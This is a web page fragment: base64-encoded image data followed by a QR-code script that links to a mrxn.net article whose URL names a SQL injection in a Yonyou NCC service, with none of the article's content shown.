Jc/Pt34H9w/6pm2zkeeLtgjh6fGPa1eMPyCsnF0HulVchfAfaDWTVwXPsUQ9flFVQTFAuA0gZgfcho4mcifwXYB+cc/2d7+xM9fL0h7fb8frJdCHjT83jZYtXB3tTC0PX0gHU4eNYyI/oXr6cVjjc6Pji06Z05HNcFUl7f0JNkbnjqwO0scFw7fnF6JoN7z/TtQqb5yv/eHWgL0WYfAbxdODj+HBlciw7OwRw9nD7x1MA9YJZHgJ6rD6wpFuSrkLZD9YBngDk16Hn0HcPeC12HnmdWW0jEi3/vDqyFQN8WOAdzjrd7wqB74gXrswesg1n19ITBteTy7JA6HF/Ho8WfPAx9NjgHYrnjs1kxArfvKc+8sw7uzay1kCQX//4dWL9czDHA28oWw2AdOqfvEUPvycz0AAlvT9lN+AqAVftKVwzWgCUDS19J+WteLznYn7y0rE9c0sEeMFePYnkqpIG90aVVwL4e//WG1Lv1BvH6Sf3ZObK9yeqLBt68NCF6WFpF1ROH40seBl8jeeX0gD3Jw7DXU6+zYO+F53rmZG74TE8dPPt6Q3JH3oTbQrJF8LbmGWGvy5fesLSKRzr0ufGCdTDXeTWG+09ZqcPj3o8vI9gHx6ycY/JXy41SlwCeo7gCrFev6jNvC5Hhwu/egbYQ2G8xR8w2wb7olcE1MNeaYrAOB5/NjT5ZcwTwjBrHK01IHpZ2hlc8tRd8fTCnX1x9NQZ7oXM87WNvxDD0JnCuCwpArOsjJxyvewrAqiUPqz8Ae5LH8yqrL17wrJmDdTCrR4hPMbgWbTLs6+oVgFsLsP7d0oVb4SuQtkN7Q768F/3iHXjpY2/Ol43CsX1wHA/0fPZMH9y/VdMzc+jXSL0y2JPrTwbXa09icA06p55ZycG+5OLpmbk8ArgXzNcborvyRni4kGw1DN5iPX9qZ1y9u1h90cHzwayakPpk1QTgVlIuRADW1/Lkk8F1ON5U9QvxKq4A98x68h2DezIHnMcb/eFCYr74792BtZBsJ5cFbw86P/LN3pmnNzzrQKQbA+vpBnMKmQHWlacG1pKrJiSfrFqQGvQZ0PP4wuC65kQLw1GrdcUV8a+FJLn4X7sD3x60fg4Bb3FOqRtUDPYpFqofeg32eXrUH+y01HYMfbb6dz5pqgngHsU7ADdZfTvcDF/B9MAxA1hvdzzgHPb8NfLjekNyJ96E188h2eJk6NtMHawrz79DsQCuRQfnqgnRw3B8uokWBvdCZ80Rqi9xGNyTPAzW1S9EF4Nr0Fk1AayrT5BWsdNSV02YuTQh+vWG5E68Ca/vIfMs4CfhmQ7cLMD6mhlBWxeSQ6+Dc3nA8ZlXHmHW4egDx2CeXvVXpB5WLXFYmnCWw/5aQFrWPQFunAIcGhD5+h5yuxNvEqwvWcBtg8Dd0fSU7HBn/BTi+wzXn+RhYF0r+TKd/PXMk3rljKqa4ujg68M9x/OMwb07n661w84rLV7wzLUQFS68xx1YC8mWcqSZRwdvMXnls57qUTx9gOSGnQcefxprAzYJsN7MWcq1xLMG+5741CPAvQ/uNfXJLyiukCasj73gZglCNdZYNaFqz2LwbOj8qA/sjUfXFJJP3tXAM8CcHnmF5HDUpVdMD9gbD/Q8fnE8iivAPVWr8XpDqlDjK/77d+ClhYC3Cp0fHRfsnU9KcnBdM6IprgB7wFxrisE6HCxdmDNnLk8F3M9IPb1hsDd1OHJwDJ3jzYxwdLD/pYWk6eL//g6shWRb4C2BOZdPfbLq0cA9YFZNgMf5zpOZqu2QenjnAV83HnAeb/SaJw7HA+4Fc/Tpiy5O7YzBs8Ac31pIkot//w6shYC3pM0KOZZiITnYB+Zai0daRfRwrSVODTwXzGf16U++Y/Cs1KDnuQbcf6wGe+MJg/WzmdLjVbzDrCdfC9k1XNrv3IH1y8VsZx4B+pNw5lNfarDvmXU4fKlNhsOjawTQ9doXT7jWFEcHzwDzrvbIK39QfTWG462LF3y9+KInv96Q3Ik34bYQ6NubZ4TH9elXDr0nT0QYXAdk3yLecEw1B9qvRmpNfuh1aRXgOnCTM2PyzfAVpP6VvkRAO2+a2kIi/rd8TX90B9ZCwNvKpsOzMXoYmJbTHNg+EbsGeOyt14e9F6yDeXcdaZml+BmgzwLnYNaszFAsgGtgTj0MXV8LSfHi378D67e9Z8fQhgXwFqHzWV/V1V9RazMGz4+evuTQ69HF8YalvQLwzPSJ0weugVk1IXXFFdEr13qN44mW/HpDcifehNtCwE/CPFu2uGPoPfFkBrgO5ug7nr3xgHvP6vFVnt6Zx7vTo00GnyO9YbjXwRqYpzezo4fXD4ZJJoOHQefqOxsM7kk9DNbBXGfBvaZ6ehVXRBeDe6GzakL6FAvJwX7l4Bg6qyaoT1BcIU2Ao0+5UH2KpQlgrzQBnLc3RIULv3sH2jd1bU7IkRTvAN4mHJyeyWDP1JPX+VODfS/s9fSLM1dxBfTe+IBqW3FqK/n8C1gf3aHzZ+npH3it53pDnt7Kv2tY30Pmk5AjQN8qOI+/8uxJHoZ9LxDL3f/pS+YD68mMMXpy8RnAvWCevWC99scDroE5erxnufRnntTD6hGuNyR35E14LQT8BIB5nk2bq4DDB0c8+3Y5nPvBtVwLnO/mTC09YXBv8vjBevLUK4M90eIF68nDcOhwxKrDPp+z5RXWQhRceI870D5lzSNli+Atg7n64qma4qknD8tzBri/jrxgHTrXmuJXkHNAnwXH/6gErmVeesJTVz5r0nYAzwZzPNcbkjvxJvzSp6ycdbd96BveedQP3SdNkB96TdojqO/fQq5T54HPk1oYrEPn9MKhR0tv8vDUwb3XG5I79Ca8voeAt5OtgfN5RrjX0xMvdE/q4emD42v2Iw+Q1tvPK9MvA9B+ZoGey/MMmQv73tTDdd7UYD8DrMcfvt6QejffIF7fQ3IO2G8t2wvHXxncW7UaQ6/vZoE9YN55NBNch4Ond+bqe4bZ8+fPn/U2gq8z62AdzJoPR6x89kgTzvTrDdHdeSOshWRbYehbznnB+vQBsawnSvUIQPuavtNh74k3DOc+6DVwrrNUPJoF7pme9EOvRw+nTwz2gllaBViHzmsh1ah4d4Ez/cwLvpD6hOlLXlk+IZpiIXlYmpC8svQK8DnAXL2Kwbp6lAtgTbEAzuURwDmYpQXy73BWjx7eLiTFi//+HWgfe8Ebh8ecY+pJAHujgXPVKmYd7IOD44dDA9J6ynDvyaxwmoH2JXTW5YsG9iZXreJMlwfcq3gHcD0zwtcbsrtbv6ithWQ7z/iVc2YG+AmYPanv+Mw79Zlr1tSSg88hT0XqOwb3pAY9zxzoevzieBRXgHtSB+fxrIUkufj370BbCHhb0PnsmHD/aw9wb56A9IL1szy6+FmvPAJ4JhwsfQc4PHAfqwesz+snD8PeV2eAPWBWTZgzpAlgX1uIChf++zvw6Ao/Xgh4s7nI2ROQeji+5JXBM8EcLziPN3py8U7b6fHtGPp1oOeaJ4B1MGuW9AppFXB4q574xwupF7/in9+BHy8kmwVvHszRXzkiuAfMsxesZ1bqYF15amANzFM/y6WDezRvB3mEXU3argaeCWZ5BOi5NOHHC9GQC//eHWgL0ZZ3OLucvKkpFpJPVk2YunLpguIKaRW1NuPqUzzryVWrAD+pQCwvM7B+6gezGuGIlZ8hZ4Dubws5a770v3cH1kLAW4LH/MqxsvlXvPLAcU3lAhwaHLFqO8DhAcc5x+RdvzT5xAJ4huJXoF6hesEzpAupKRZgX18Lifni378D/wcAAP//48kESwAAAAZJREFUAwCaw2+818TKeAAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-ncc-uapws-service-IBapIOService-getBapTable-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 